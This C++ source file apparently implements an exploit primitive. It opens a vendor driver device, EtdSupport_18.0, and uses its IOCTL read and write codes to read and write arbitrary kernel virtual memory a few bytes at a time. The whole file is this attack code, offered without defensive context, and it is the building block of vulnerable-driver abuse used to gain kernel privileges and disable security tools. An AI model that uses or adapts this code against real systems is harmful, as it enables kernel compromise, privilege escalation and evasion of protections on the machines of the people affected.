#include "HpSupportMemoryMgr.h"

HpSupportMemoryMgr::HpSupportMemoryMgr() {}

BOOL HpSupportMemoryMgr::init()
{
	this->hDevice = CreateFileA(
		R"(\\.\EtdSupport_18.0)",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	return this->hDevice != NULL && this->hDevice != INVALID_HANDLE_VALUE;
}

BOOL HpSupportMemoryMgr::ReadVirtData(UINT64 address, SIZE_T szRead, PVOID data)
{
	BOOL bRes = FALSE;
	EDTI_DATA edr = { 0 };
	EDTI_READ edr_out = { 0 };
	DWORD dwBytesReturned = 0;
	SIZE_T szRem = szRead;

	if (!(data && szRead)) {
		return FALSE;
	}


	while (szRem != 0) {
		SIZE_T offset = szRead - szRem;
		edr.read.src = (address + offset);

		if (szRem >= 4) {
			edr.read.szRead = 4;
			szRem -= 4;
		}
		else if (szRem >= 2) {
			edr.read.szRead = 2;
			szRem -= 2;
		}
		else if (szRem == 1)
		{
			edr.read.szRead = 1;
			--szRem;
		}

		bRes = DeviceIoControl(
			this->hDevice,
			IOCTL_READ,
			&edr,
			sizeof(EDTI_READ),
			&edr,
			sizeof(EDTI_READ),
			&dwBytesReturned,
			NULL
		);

		if (!bRes) {
			GLE("DeviceIoControl Failed");
			DumpHex(&edr, sizeof(EDTI_DATA));
			return FALSE;
		}		

		switch (edr.read.szRead)
		{
		case 1:
			*(PBYTE)((UINT64)data + offset) = (BYTE)edr.read.data;
			break;
		case 2:
			*(PWORD)((UINT64)data + offset) = (WORD)edr.read.data;
			break;
		case 4:
			*(PDWORD)((UINT64)data + offset) = (DWORD)edr.read.data;
			break;
		default:
			break;
		}
	}

	return TRUE;
}

BOOL HpSupportMemoryMgr::WriteVirtData(UINT64 dest, SIZE_T szWrite, PVOID data)
{
	BOOL bRes = FALSE;
	EDTI_DATA edr = { 0 };
	EDTI_READ edr_out = { 0 };
	DWORD dwBytesReturned = 0;
	SIZE_T szRem = szWrite;

	if (!(data && szWrite)) {
		return FALSE;
	}

	while (szRem != 0) {
		SIZE_T offset = szWrite - szRem;
		edr.write.where = (dest + offset);

		if (szRem >= 4) {
			edr.write.szWrite = 4;
			edr.write.what = *(PDWORD)((UINT64)data + offset);
			szRem -= 4;
			
		}
		else if (szRem >= 2) {
			edr.write.szWrite = 2;
			edr.write.what = *(PWORD)((UINT64)data + offset);
			szRem -= 2;
		}
		else if (szRem == 1)
		{
			edr.write.szWrite = 1;
			edr.write.what = *(PBYTE)((UINT64)data + offset);
			--szRem;
		}

		bRes = DeviceIoControl(
			this->hDevice,
			IOCTL_WRITE,
			&edr,
			sizeof(EDTI_READ),
			NULL,
			0,
			&dwBytesReturned,
			NULL
		);

		if (!bRes) {
			GLE("DeviceIoControl Failed");
			return FALSE;
		}
	}

	return TRUE;
}

